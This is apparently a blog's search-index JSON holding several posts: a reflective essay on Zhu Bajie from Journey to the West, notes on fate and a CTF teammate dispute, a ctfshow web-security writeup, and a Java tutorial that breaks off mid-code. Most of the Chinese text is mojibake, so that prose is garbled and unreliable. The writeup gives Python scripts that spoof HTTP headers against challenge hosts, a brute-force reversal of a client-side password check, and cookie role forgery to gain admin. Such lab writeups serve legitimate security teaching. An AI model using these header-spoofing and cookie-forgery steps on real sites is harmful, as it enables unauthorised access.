è¥¿æ¸¸è®°ï¼ˆ2025.10.07ï¼‰çŒªå…«æˆ’æœ‰æ—¶å€™å¾ˆå›°æƒ‘ï¼Œä¸ºä»€ä¹ˆçŒ´å­çš„é‡‘ç®æ£’è¿‡å»èƒ½æ‰“å¾—é€€åä¸‡å¤©å…µå¤©å°†ï¼Œç°åœ¨å´è¿ä¸€ä¸ªå±±è¾¹çš„å¦–æ€ªéƒ½æ–—ä¸è¿‡ï¼›ä¸ºä»€ä¹ˆæ²™å’Œå°šæ‹…ç€æœ€å¤šæœ€é‡çš„è¡Œæï¼Œå´æ€»æ˜¯æ²‰é»˜ç€ä¸è¯´è¯ï¼›ä¸ºä»€ä¹ˆå¸ˆå‚…å˜´ä¸Šå£å£å£°å£°ä¼—ç”Ÿå¹³ç­‰ï¼Œè·¯è¿‡ç‹ä¾¯å°†ç›¸çš„é—¨å‰å´æ€»æ˜¯æ…Œå¿™è·ªæ‹œã€‚çŒªå…«æˆ’å¸¸å¸¸æƒ³ä¸æ˜ç™½ï¼Œä¸ºä»€ä¹ˆä¸€å®šè¦å¦å®šæ¬²æœ›æ‰èƒ½æˆä¸ºä¼Ÿå¤§çš„ä½›ï¼Œä¸ºä»€ä¹ˆä¼Ÿå¤§çš„ä½›ä¸€è¾¹è¯´ç€æ™®æ¸¡ä¼—ç”Ÿï¼Œä¸€è¾¹å´è®©ä¼—ç”Ÿä¾›å¥‰ç€ä»–ä»¬çš„é‡‘èº«ã€‚ çŒªå…«æˆ’æ˜¯å¤´çŒªï¼Œè‚šå­æ€»æ¯”è„‘å­å…ˆå‘å‡ºä¿¡å·ã€‚çŒªå…«æˆ’è´ªåƒï¼Œæ˜¯å› ä¸ºåšè¿‡é¥¿æ­»çš„é‡çŒªï¼›çŒªå…«æˆ’å¥½è‰²ï¼Œæ˜¯å› ä¸ºä½“ä¼šè¿‡è¢«è´¬ä¸‹å‡¡çš„å­¤ç‹¬ï¼›çŒªå…«æˆ’æƒ³å›é«˜è€åº„ï¼Œæ˜¯å› ä¸ºçŒªå…«æˆ’æ›¾ç»çš„å®¶åœ¨å¤©ä¸Šï¼ŒçŒªå…«æˆ’çŸ¥é“æ— å®¶å¯å½’çš„æ»‹å‘³ã€‚çŒªå…«æˆ’æ‰›ç€é’‰è€™èµ°åœ¨æœ€åé¢ï¼Œçœ‹ç€çŒ´å­æ°¸è¿œé‚£ä¹ˆæ–—å¿—æ˜‚æ‰¬ï¼Œæ²™åƒ§è¿˜æ˜¯é‚£ä¹ˆä»»åŠ³ä»»æ€¨ï¼Œå¸ˆå‚…ä¾æ—§ä½å¤´å¿µç»ã€‚ èµ°ç€èµ°ç€ï¼ŒçŒªå…«æˆ’çš„è‚šå­é¥¿äº†ï¼Œå–ç»çš„è·¯å¾ˆé•¿ï¼ŒçŒªå…«æˆ’æ€»æ˜¯å¾ˆé¥¿ã€‚å¯æ˜¯çŒªå…«æˆ’çš„è‚šå­è¶Šé¥±ï¼ŒçŒªå…«æˆ’çš„å¿ƒå°±è¶Šç©ºã€‚çŒªå…«æˆ’æ˜¯å¤´çŒªï¼Œä»–æƒ³ä¸æ˜ç™½ï¼Œè¿™è¥¿å¤©å–çš„æ˜¯ä»€ä¹ˆç»ï¼Ÿåº¦çš„åˆæ˜¯ä»€ä¹ˆäººï¼Ÿç‹®é©¼å²­çš„é‡‘ç¿…å¤§é¹ï¼Œè®ºè¾ˆåˆ†æ˜¯å¦‚æ¥ä»–äºŒèˆ…ï¼›é‚£ç¥é€šå¹¿å¤§çš„é’ç‰›ç²¾ï¼Œå±…ç„¶æ˜¯å¤ªä¸Šè€å›çš„åéª‘ï¼›æ‹¿ç€ç´«é‡‘é“ƒçš„èµ›å¤ªå²ï¼Œå±…ç„¶æ˜¯è§‚éŸ³è©è¨èƒ¯ä¸‹çš„é‡‘æ¯›çŠ¼ã€‚è¿™å–ç»çš„è¿‡ç¨‹ï¼Œå¥½åƒåœ¨ç¥ä»™çš„åèŠ±å›­é‡Œé¢ä¸€è·¯å…œå…œè½¬è½¬ã€‚çŒªå…«æˆ’ä¹Ÿæ›¾å½“è¿‡å¤©è“¬å…ƒå¸…ï¼Œå±•é¦†è¿‡8ä¸‡æ°´å†›ï¼Œé«˜é«˜åœ°å±…ä½åœ¨å¤©ä¸Šï¼Œå´å› ä¸ºä½œé£é—®é¢˜è¢«ä¸€æ’¸åˆ°åº•ï¼ŒçŒªå…«æˆ’æ„Ÿè§‰å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆé‚£äº›ç¥ä»™çš„å® ç‰©å± åŸåƒäººï¼ŒçŠ¯ä¸‹çš„ç½ªå­½ï¼Œæ¯”ä»–å½“å¹´çš„é‚£ç‚¹å°å¿ƒæ€é‡äº†ä¸çŸ¥å¤šå°‘å€ï¼Œå´èƒ½è¢«ç¥ä»™ç”¨ä¸€å¥å­½ç•œè½»è½»å¸¦è¿‡ã€‚æ²™å’Œå°šæ²‰é»˜åœ°åˆæŒ‘èµ·æ‰æ‹…ï¼ŒçŒ´å­çœ¯ç€çœ¼ç›çœ‹ç€çŒªå…«æˆ’ï¼Œç¬‘çŒªå…«æˆ’æ˜¯ä¸ªå‘†å­ï¼Œå¸ˆå‚…è™”è¯šåœ°é»˜å¿µç€ç»æ–‡ï¼Œç¥ˆæ±‚ä½›ç¥–ä¿ä½‘ä»–ä»¬æ¸¡è¿‡éš¾å…³ã€‚ è¥¿è¡Œçš„è·¯å¾ˆé•¿ï¼ŒçŒªå…«æˆ’æ€»æ˜¯å¾ˆé¥¿ã€‚å¯æ˜¯çŒªå…«æˆ’çš„è‚šå­è¶Šé¥±ï¼ŒçŒªå…«æˆ’çš„å¿ƒå°±è¶Šç©ºã€‚çŒªå…«æˆ’æ˜¯å¤´çŒªï¼Œå¯å°±ç®—æ˜¯æ˜¯å¤´çŒªï¼Œä¹Ÿå¼€å§‹æ˜ç™½äº†ã€‚åŸæ¥å–ç»è·¯ä¸Šåº¦çš„ä¸æ˜¯ä¼—ç”Ÿï¼Œè€Œæ˜¯ç¥ä»™ä»¬çš„æ— èŠå…‰é˜´ã€‚åŸæ¥èµ°ä¸ªè¿‡åœºå°±èƒ½æˆä½›åšç¥–ï¼ŒåŸæ¥ç«¯ç€ç¼æµ†ç‰éœ²æ‰ä¼šè¯´æ¸…å¿ƒå¯¡æ¬¢ï¼ŒåŸæ¥åªæœ‰è‡ªå·±è¸©ç€äº”å½©ç¥¥äº‘æ‰èƒ½è¦æ±‚åˆ«äººè„šè¸å®åœ°ã€‚å¶å­ç»¿äº†é»„ï¼Œé»„äº†å´ä¸ä¼šç»¿ã€‚å¤©äº®äº†é»‘ï¼Œé»‘äº†å´ä¸ä¼šäº®ã€‚çµå±±è„šä¸‹çš„å’Œå°šï¼ŒæŠŠé¦™ç«é’±è£…è¿›ç»£èŠ±å£è¢‹ï¼Œå‡¤ä»™éƒ¡ä¸‰å¹´éƒ½ä¸ä¸‹é›¨ï¼Œç‰å¸åœ¨å¤©ä¸Šå¬æ­Œï¼Œæ¯”ä¸˜å›½çš„å›½ä¸ˆåƒç€ä¸€åƒä¸ªå°å­©çš„å¿ƒè‚ï¼Œå¤©é»‘äº†ï¼Œå¤©å°±æ²¡äº®ã€‚ è¥¿è¡Œçš„è·¯å¾ˆé•¿ï¼ŒçŒªå…«æˆ’æ€»æ˜¯å¾ˆé¥¿ã€‚ä»–æŠŠæ–‹é¥­ä¸å›°æƒ‘åƒåˆ°è‚šå­é‡Œï¼Œæ¥å¡«å¿ƒçš„çªŸçª¿ã€‚å¯æ˜¯çŒªå…«æˆ’çš„è‚šå­è¶Šé¥±ï¼Œå¿ƒçš„çªŸçª¿å°±è¶Šå¤§ã€‚åŸæ¥æ‰€è°“çš„å…«åä¸€éš¾ä»æ¥ä¸åœ¨è·¯ä¸Šï¼Œè€Œåœ¨å¤©ä¸Šã€‚åŸæ¥å–ç»æœ€ç´¯çš„ä¸æ˜¯é™å¦–ï¼Œè€Œæ˜¯è’™ç€çœ¼ç›æ¼”æˆã€‚å–æ¥çš„å‡çœŸç»é‡Œé¢æ ¹æœ¬å°±æ²¡æœ‰å­—ï¼Œæˆ–è®¸çœŸç»åªæ˜¯ä¸€é—¨é•œå­ï¼Œç…§å‡ºäº†è¿™æ»¡å¤©ç¥ä½›çš„ç”Ÿæ„ç»ï¼Œç…§å‡ºäº†è¿™å®å¤§å™äº‹çš„åº•è£¤ï¼Œæˆ–è®¸ä¿®æ¥çš„æ­£æœä¸æ˜¯æˆ’æ‰æ¬²æœ›ï¼Œè€Œæ˜¯ç»™æ¬²æœ›ç©¿ä¸Šå¾—ä½“çš„è¢ˆè£Ÿï¼Œé«˜å±…åœ¨åº™å ‚ä¸Šã€‚ çŒªå…«æˆ’æ€»æ˜¯å–œæ¬¢ç¡è§‰ï¼Œæˆ–è®¸æ˜¯æ¢¦é‡Œä¸ä¼šå¤©é»‘ï¼Œæ²¡æœ‰å‡Œéœ„å®æ®¿ï¼Œä¹Ÿæ²¡æœ‰æƒºæƒºä½œæ€çš„ç¥ä»™ã€‚å–ç»è·¯ä¸Šï¼Œä¸€ä¸ªæ›¾å¤§é—¹å¤©å®«çš„çŒ´å­ï¼Œä¸€ä¸ªé»˜ä¸ä½œå£°çš„é—·è‘«èŠ¦ï¼Œä¸€ä¸ªæŠŠç¥ä»™ç”»çš„å¤§é¥¼ä¿¡ä»¥ä¸ºçœŸçš„å’Œå°šï¼Œè¿˜æœ‰ä¸€å¤´æ€»æ˜¯å–Šé¥¿ï¼Œé™ªç€å”±æˆçš„çŒªï¼Œå­¤ç‹¬åœ°èµ°ç€ã€‚ åŠŸå¤«ç†ŠçŒ«ï¼ˆ2025.11.20ï¼‰Yesterday is history, tomorrow is a mystery, but today is a gift. That is why it is called the present.","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://archer-baiyi.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[]},{"title":"éšç¬”","slug":"ç¢ç¢å¿µ/éšç¬”","date":"2025-09-26T16:13:05.000Z","updated":"2025-09-26T20:35:17.649Z","comments":true,"path":"2025/09/26/ç¢ç¢å¿µ/éšç¬”/","permalink":"https://archer-baiyi.github.io/2025/09/26/%E7%A2%8E%E7%A2%8E%E5%BF%B5/%E9%9A%8F%E7%AC%94/","excerpt":"","text":"å‘½è¿ ï¼ˆ2025.09.26ï¼‰æˆ‘è§‰å¾—ç›¸ä¿¡å‘½è¿å¹¶ä¸ä»£è¡¨ç€è§‰å¾—ä¸€åˆ‡åŠªåŠ›éƒ½æ²¡æœ‰ä»»ä½•æ„ä¹‰ä»è€Œå¼€å§‹æ”¾å¼ƒåŠªåŠ›ï¼Œè€Œæ˜¯ç«­å°½å…¨åŠ›å»äº‰å–è‡ªå·±æƒ³è¦çš„ä¸œè¥¿ï¼Œä¸è®ºç»“æœå¦‚ä½•ï¼Œæ»¡æ„æ˜¯å¦ï¼Œéƒ½å‘Šè¯‰è‡ªå·±æœ€ç»ˆçš„ç»“æœæ˜¯å‘½è¿çš„å®‰æ’ï¼Œä»¥æ­¤æ¥åœ¨ç»“æœä¸æ•¬å¦‚äººæ„æ—¶æ…°è—‰è‡ªå·±ã€‚ å‘½è¿å¹¶ä¸æ˜¯æ”¾å¼ƒçš„å€Ÿå£ï¼Œè€Œæ˜¯åŠªåŠ›æ‹¼æåå®‰æ…°è‡ªå·±çš„è¯è¯­ã€‚å¹¶ä¸æ˜¯åŠªåŠ›å°±å¯ä»¥æˆåŠŸè·å¾—è‡ªå·±æƒ³è¦çš„ä¸œè¥¿ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†åŠªåŠ›éƒ½æ˜¯æœ‰æ„ä¹‰çš„ã€‚ CTFï¼ˆ2025.07.02ï¼‰åœ¨ä¸ä¹…å‰çš„ä¸€åœºCTFæ¯”èµ›ä¸­å‘ç”Ÿäº†è¿™æ ·ä¸€ä»¶äº‹æƒ…ï¼šæˆ‘å’Œé˜Ÿé‡Œå¦ä¸€ä½æˆå‘˜ç¢°å·§åŒæ—¶å¼€å§‹ç ”ç©¶ä¸€é“å¯†ç å­¦é¢˜ç›®ï¼Œå½¼æ­¤å´æ¯«ä¸çŸ¥æƒ…ã€‚æˆ‘å…ˆä¸€æ­¥è§£å‡ºå¹¶æäº¤äº†flagï¼›æ²¡è¿‡å¤šä¹…ï¼Œä»–ä¹ŸæˆåŠŸæäº¤äº†ç­”æ¡ˆï¼Œè¿™æ‰å‘ç°æˆ‘å·²ç»æäº¤è¿‡äº†ã€‚ä»–éšå³æ˜ç¡®åœ°å‘æˆ‘è¡¨è¾¾äº†ä¸æ»¡ï¼šâ€œIt is very annoying to see after solving a task, that it was solved alreadyâ€ã€‚æˆ‘å°è¯•ä¸ä»–æ²Ÿé€šï¼Œä½†æœ€ç»ˆæœªèƒ½è¾¾æˆä¸€è‡´ï¼Œä»–ç´¢æ€§ä¸å†å›æ¶ˆæ¯ï¼Œä¹Ÿåœæ­¢äº†åšé¢˜ã€‚ å¦ç™½è¯´ï¼Œæˆ‘è§‰å¾—è¿™æœ¬èº«æ˜¯ä»¶å°äº‹ï¼Œå³ä½¿å‘ç”Ÿåœ¨æˆ‘èº«ä¸Šä¹Ÿä¸ä¼šå¤ªè¿‡åœ¨æ„ã€‚ä½†è¿™ä¸ç”±å¾—è®©æˆ‘æ€è€ƒï¼šæˆ‘å‚ä¸CTFçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿåœ¨CTFçš„è¿‡ç¨‹ä¸­ï¼Œä»€ä¹ˆæ‰æ˜¯æœ€é‡è¦çš„ï¼Ÿæˆ–è€…è¯´ï¼Œç›¸å¯¹æ›´å€¼å¾—çè§†çš„æ˜¯ä»€ä¹ˆï¼Ÿ æˆ‘æ¥è§¦CTFçš„å¥‘æœºé¢‡æœ‰æ„æ€çš„ï¼šä¸€å¼€å§‹è¢«åŒå­¦æ‹‰å»ä¸Šäº†ç½‘ç»œå®‰å…¨è¿™é—¨è¯¾ï¼Œå¹¶åšæŒå®Œæˆäº†æ‰€æœ‰ä½œä¸šã€‚è¿™é—¨è¯¾çš„ä½œä¸šå½¢å¼åŸºæœ¬ä¸Šå°±æ˜¯CTFé¢˜â€”â€”ç¼–å†™è„šæœ¬è·å–flagã€‚åæ¥æœºç¼˜å·§åˆï¼Œå¾—çŸ¥å­¦æ ¡æœ‰æ”¯CTFé˜Ÿä¼ï¼Œä¾¿è”ç³»è´Ÿè´£äººåŠ å…¥å…¶ä¸­ã€‚ æœ€åˆå‚ä¸CTFæ—¶ï¼Œæˆ‘çš„åŠ¨æœºå¤šå°‘æœ‰äº›åŠŸåˆ©ï¼ˆè‡³ä»Šä¹Ÿæœªèƒ½å®Œå…¨æ‘†è„±è¿™ä¸ªæƒ³æ³•ï¼‰ï¼šä½œä¸ºçº¯æ•°å­¦ä¸“ä¸šçš„å­¦ç”Ÿï¼Œæˆ‘å‡ ä¹æ²¡æœ‰ä»»ä½•ç«èµ›ç»å†å’Œå¥–é¡¹ï¼Œæ‰¾å®ä¹ æ—¶å±¡å±¡ç¢°å£ã€‚æ‰€ä»¥æˆ‘å¾ˆå¸Œæœ›å¯ä»¥å€Ÿç€è¿™ä¸ªæœºä¼šå¤šå¤šå‚åŠ æ¯”èµ›ã€äº‰å–å¥½åæ¬¡æ¥ä¸°å¯Œç®€å†ã€‚ç„¶è€Œï¼Œéšç€ä¸€åœºåœºæ¯”èµ›çš„è¿›è¡Œï¼Œæˆ‘æ¸æ¸å‘ç°ï¼Œæˆ‘åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å­¦åˆ°äº†å¤ªå¤šä¸œè¥¿ï¼šå¤šç§è¯­è¨€çš„ä»£ç èƒ½åŠ›ï¼Œé«˜æ•ˆæ£€ç´¢ä¿¡æ¯ï¼ˆæ¯”å¦‚ç‰¹å®šæ¼æ´ä»¥åŠæ”»å‡»æ‰‹æ®µï¼‰çš„èƒ½åŠ›ç­‰ç­‰â€¦â€¦ è¿™äº›éƒ½å¼¥è¶³çè´µã€‚ å›åˆ°è§£é¢˜æœ¬èº«ï¼Œæˆ‘è§‰å¾—æœ€æœ‰æˆå°±æ„Ÿçš„æ˜¯å¾—åˆ°æ­£ç¡®flagçš„ç¬é—´ï¼Œä½†æ›´é‡è¦çš„æ˜¯è‡ªå·±æˆåŠŸåšå‡ºæ¥è¿™é“é¢˜çš„è¿‡ç¨‹ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä½ å¯èƒ½æ±²å–æ–°çŸ¥ï¼Œä¹Ÿå¯èƒ½å°†è¿‡å¾€æ‰€å­¦ä»˜è¯¸å®è·µå¹¶è·å¾—æˆåŠŸã€‚æˆ‘è§‰å¾—è¿™ä¸ªè¿‡ç¨‹æ‰æ˜¯CTFä¸­æœ€æœ‰æ„ä¹‰çš„äº‹æƒ…ï¼Œè·å–å¹¶æäº¤flagï¼Œæ›´åƒæ˜¯æˆåŠŸçš„æ³¨è„šï¼Œæˆ–æ˜¯å¯¹åŠªåŠ›çš„å˜‰å¥–ã€‚ å½“ç„¶ï¼Œæ¯”èµ›ä¸­æäº¤flagäº‰å–åˆ†æ•°æ˜¯ä¸»è¦ç›®æ ‡ã€‚ä½†ä½œä¸ºä¸€ä¸ªé˜Ÿä¼ï¼Œå®åœ¨ä¸å¿…è¿‡åˆ†çº ç»“äºè°å…ˆè§£å‡ºã€‚å› ä¸ºå¤§å®¶æœ€ç»ˆçš„ç›®çš„ä¸éƒ½æ˜¯ä¸ºäº†äº‰å–ä¸€ä¸ªç†æƒ³çš„åæ¬¡å—ï¼Ÿæ›´ä½•å†µï¼Œä»–äººç‡å…ˆè§£é¢˜çš„æˆåŠŸï¼Œç»ä¸æ„å‘³ç€å¦å®šä½ åœ¨æ­¤è¿‡ç¨‹ä¸­ä»˜å‡ºçš„åŠªåŠ›å’Œè·å¾—çš„æˆæœã€‚ ä¹Ÿä¸çŸ¥é“ä¹‹åæ˜¯å¦æœ‰æœºä¼šä¸ä»–è§£å¼€çŸ›ç›¾ï¼Œä½†è¿™å¹¶ä¸é‡è¦ã€‚é‡è¦çš„æ˜¯ï¼Œè¿™æ¬¡å°å°çš„å†²çªè®©æˆ‘æœ‰æœºä¼šåœä¸‹æ¥ï¼Œè®¤çœŸå®¡è§†è‡ªå·±å‚ä¸ CTF çš„åˆè¡·å’Œç›®æ ‡ã€‚ä»æœ€åˆä¸ºäº†ä¸°å¯Œç®€å†ã€æå‡æ±‚èŒç«äº‰åŠ›ï¼Œåˆ°å¦‚ä»Šæ›´çœ‹é‡è§£é¢˜è¿‡ç¨‹ä¸­çš„å­¦ä¹ å’Œæˆé•¿ï¼Œæˆ‘çš„å¿ƒæ€å‘ç”Ÿäº†è½¬å˜ã€‚ CTF ä¸å†ä»…ä»…æ˜¯æ¯”èµ›ï¼Œè€Œæ˜¯æˆ‘å­¦ä¹ å’Œæå‡è‡ªæˆ‘çš„ä¸€ä¸ªå¹³å°ã€‚ è¿™æ¬¡ç»å†è®©æˆ‘æ˜ç™½ï¼Œå›¢é˜Ÿåˆä½œå’Œå…±åŒè¿›æ­¥è¿œæ¯”ä¸ªäººåæ¬¡å’ŒçŸ­æš‚çš„ä¼˜èƒœæ„Ÿæ›´æœ‰ä»·å€¼ã€‚å³ä½¿æœªèƒ½è·å¾—ç†æƒ³çš„åæ¬¡ï¼Œåªè¦åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æŒç»­å­¦ä¹ ã€ä¸æ–­è¿›æ­¥ï¼Œå°±å·²ç»è¶³å¤Ÿä»¤äººæ¬£æ…°ã€‚è€Œè¿™ä»½æ€è€ƒå’Œæˆé•¿ï¼Œè¿œæ¯”ä»»ä½•ä¸€ä¸ª flag éƒ½çè´µã€‚ æˆ‘å¾ˆé«˜å…´ï¼Œè¿™æ¬¡ç»å†è®©æˆ‘åœ¨è¿·èŒ«ä¸­æ‰¾åˆ°äº†æ–¹å‘ï¼Œè€Œä¸æ˜¯ç›²ç›®åœ°ç»§ç»­å‰è¿›ã€‚","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://archer-baiyi.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[]},{"title":"ctfshow Webåº”ç”¨å®‰å…¨ä¸é˜²æŠ¤ Writeup","slug":"CTF/Web/ctfshow-Webåº”ç”¨å®‰å…¨ä¸é˜²æŠ¤-Writeup","date":"2025-09-21T09:15:47.000Z","updated":"2025-09-21T10:01:27.699Z","comments":true,"path":"2025/09/21/CTF/Web/ctfshow-Webåº”ç”¨å®‰å…¨ä¸é˜²æŠ¤-Writeup/","permalink":"https://archer-baiyi.github.io/2025/09/21/CTF/Web/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4-Writeup/","excerpt":"","text":"è¿™ä¸ªæ¿å—ç®—æ˜¯Webçš„å…¥é—¨æ¿å—ï¼Œè€ƒç‚¹éƒ½æ¯”è¾ƒåŸºç¡€ã€‚ ç¬¬ä¸€ç« Base64ç¼–ç éšè— æŒ‰F12æŸ¥çœ‹ç½‘é¡µå‰ç«¯ä¿¡æ¯ï¼š ä¸éš¾å‘ç°è¿™é‡Œæœ‰Base64ç¼–ç çš„å†…å®¹ï¼š 1const correctPassword = &quot;Q1RGe2Vhc3lfYmFzZTY0fQ==&quot;; Base64è§£ç å¾—åˆ°å¯†ç ï¼ˆåŒæ ·ä¹Ÿæ˜¯flagï¼‰ï¼š 1CTF&#123;easy_base64&#125; HTTPå¤´æ³¨å…¥å°è¯•ç”¨ç¬¬ä¸€é¢˜çš„å¯†ç ç™»å½•ï¼Œæç¤ºï¼š ç”¨è¿™æ®µä»£ç è®¿é—®ç½‘é¡µå¹¶ä¿®æ”¹HTTPå¤´ï¼š 1234567891011121314151617181920import requestsurl = &quot;http://85707809-d992-463a-8302-27b63c874e9e.challenge.ctf.show/check.php&quot;data = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;CTF&#123;easy_base64&#125;&quot;,&#125;headers = &#123; &quot;User-Agent&quot;: &quot;ctf-show-brower&quot;,&#125;with requests.Session() as s: s.headers.update(headers) r = s.post(url, data=data, timeout=10, allow_redirects=True) print(&quot;Status:&quot;, r.status_code) print(r.text) å³å¯å¾—åˆ°flagï¼š 1CTF&#123;user_agent_inject_success&#125; Base64å¤šå±‚åµŒå¥—è§£ç å’Œç¬¬ä¸€é¢˜ç±»ä¼¼ï¼Œå¯ä»¥å‘ç°è¿™æ®µå†…å®¹ï¼š 12345678910111213141516171819202122document.getElementById(&#x27;loginForm&#x27;).addEventListener(&#x27;submit&#x27;, function(e) &#123; const correctPassword = &quot;SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=&quot;; function validatePassword(input) &#123; let encoded = btoa(input); encoded = btoa(encoded + &#x27;xH7jK&#x27;).slice(3); encoded = btoa(encoded.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)); encoded = btoa(&#x27;aB3&#x27; + encoded + &#x27;qW9&#x27;).substr(2); return btoa(encoded) === correctPassword; &#125; const enteredPassword = document.getElementById(&#x27;password&#x27;).value; const messageElement = document.getElementById(&#x27;message&#x27;); if (!validatePassword(enteredPassword)) &#123; e.preventDefault(); messageElement.textContent = &quot;Login failed! Incorrect password.&quot;; messageElement.className = &quot;message error&quot;; &#125;&#125;); ç”¨ä¸‹é¢è¿™æ®µä»£ç è®¡ç®—å‡ºä¸€ä¸ªå¯ä»¥é€šè¿‡è¿™ä¸ªæ£€æµ‹çš„å¯†ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import base64, stringCORRECT = &quot;SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=&quot;B64CH = string.ascii_letters + string.digitsdef find(): s4 = base64.b64decode(CORRECT, validate=True).decode(&quot;ascii&quot;) for a in B64CH: for b in B64CH: try: blob = base64.b64decode(a + b + s4, validate=True) except Exception: continue if not (blob.startswith(b&quot;aB3&quot;) and blob.endswith(b&quot;qW9&quot;)): continue s3 = blob[3:-3] try: s2 = base64.b64decode(s3.decode(&quot;ascii&quot;), validate=True)[::-1] except Exception: continue for x in B64CH: for y in B64CH: for z in B64CH: try: blob2 = base64.b64decode((x + y + z).encode() + s2, validate=True) except Exception: continue if not blob2.endswith(b&quot;xH7jK&quot;): continue s1 = blob2[:-5] try: pwd = base64.b64decode(s1, validate=True).decode(&quot;utf-8&quot;) except Exception: continue if all(ch in string.ascii_letters + string.digits for ch in pwd): return pwdif __name__ == &quot;__main__&quot;: print(find())# 7A7316 ç„¶åä½¿ç”¨è¿™æ®µä»£ç è®¿é—®ç½‘é¡µï¼š 1234567891011121314151617181920import requestsurl = &quot;http://36e2e54a-7a81-41a7-86b1-90d6115c142c.challenge.ctf.show/check.php&quot;data = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;7A7316&quot;,&#125;headers = &#123; &quot;User-Agent&quot;: &quot;ctf-show-brower&quot;,&#125;with requests.Session() as s: s.headers.update(headers) r = s.post(url, data=data, timeout=10, allow_redirects=True) print(&quot;Status:&quot;, r.status_code) print(r.text) å¾—åˆ°flagï¼š 1CTF&#123;base64_brute_force_success&#125; HTTPSä¸­é—´äººæ”»å‡»Cookieä¼ªé€  é€šè¿‡çŒœæµ‹/çˆ†ç ´å¾—åˆ°å¯†ç ä¸ºguestï¼Œå¹¶ç™»å½•ï¼š å°†roleçš„å€¼ä¿®æ”¹ä¸ºadminç„¶ååˆ·æ–°é¡µé¢å³å¯å¾—åˆ°flagï¼š 1CTF&#123;cookie_injection_is_fun&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/tags/ctfshow/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"}]},{"title":"Javaå…¥é—¨","slug":"ç¼–ç¨‹/Javaå…¥é—¨","date":"2025-08-29T05:45:26.000Z","updated":"2025-11-23T17:10:16.976Z","comments":true,"path":"2025/08/29/ç¼–ç¨‹/Javaå…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/08/29/%E7%BC%96%E7%A8%8B/Java%E5%85%A5%E9%97%A8/","excerpt":"","text":"[TOC] ä»‹ç»Javaæ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—æœºç¼–ç¨‹è¯­è¨€ï¼Œæ‹¥æœ‰è·¨å¹³å°ã€é¢å‘å¯¹è±¡ã€æ³›å‹ç¼–ç¨‹çš„ç‰¹æ€§ï¼Œå¹¿æ³›åº”ç”¨äºä¼ä¸šçº§Webåº”ç”¨å¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘ã€‚ Hello World12345public class HelloWorld &#123; public static void main(String[] args) &#123; System.out.println(&quot;Hello, World!&quot;); &#125;&#125; public class HelloWorldï¼šå®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œç±»åå¿…é¡»å’Œæ–‡ä»¶åä¸€è‡´ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ï¼Œæ‰€ä»¥è¿™ä»½æ–‡ä»¶å¿…é¡»å–åä¸ºHelloWorld.javaã€‚ public static void main(String[] args)ï¼šè¿™æ˜¯ Java ç¨‹åºçš„å…¥å£æ–¹æ³•ï¼Œè¿è¡Œæ—¶ä¼šä»è¿™é‡Œå¼€å§‹æ‰§è¡Œã€‚ String[] argsï¼šç”¨æ¥æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°ï¼Œæ¯”å¦‚è¿è¡Œæ—¶ java HelloWorld a b cï¼Œargs å°±æ˜¯ [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]ã€‚ String args[] ä¸ String[] args éƒ½å¯ä»¥æ‰§è¡Œï¼Œä½†æ¨èä½¿ç”¨ String[] argsï¼Œè¿™æ ·å¯ä»¥é¿å…æ­§ä¹‰å’Œè¯¯è¯»ã€‚ System.out.println(&quot;Hello, World!&quot;);ï¼šå‘æ§åˆ¶å°è¾“å‡º &quot;Hello, World!&quot;ã€‚ æ³¨æ„ï¼Œä¸€ä»½javaæ–‡ä»¶é‡Œæœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªpublic classã€‚ é¢å‘å¯¹è±¡ç¼–ç¨‹é¢å‘å¯¹è±¡æ„å‘³ç€ç¨‹åºé€šè¿‡â€œå¯¹è±¡â€æ¥ç»„ç»‡å’Œè¿è¡Œã€‚è€Œåœ¨ Java ä¸­ï¼Œç±»ï¼ˆclassï¼‰æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œæè¿°äº†å¯¹è±¡çš„å±æ€§å’Œè¡Œä¸ºã€‚ ç±»ä¸­å¯ä»¥åŒ…å«ï¼š å­—æ®µï¼ˆfieldï¼‰ï¼šç”¨æ¥è¡¨ç¤ºå¯¹è±¡çš„æ•°æ®ã€‚ æ–¹æ³•ï¼ˆmethodï¼‰ï¼šç”¨æ¥å®šä¹‰å¯¹è±¡èƒ½åšçš„äº‹ã€‚ ä¾‹å­ï¼š 1234567891011121314151617181920class Person &#123; // å­—æ®µ String name; int age; // æ–¹æ³• void sayHello() &#123; System.out.println(&quot;Hello, my name is &quot; + name); &#125;&#125;// ä½¿ç”¨ç±»public class test &#123; 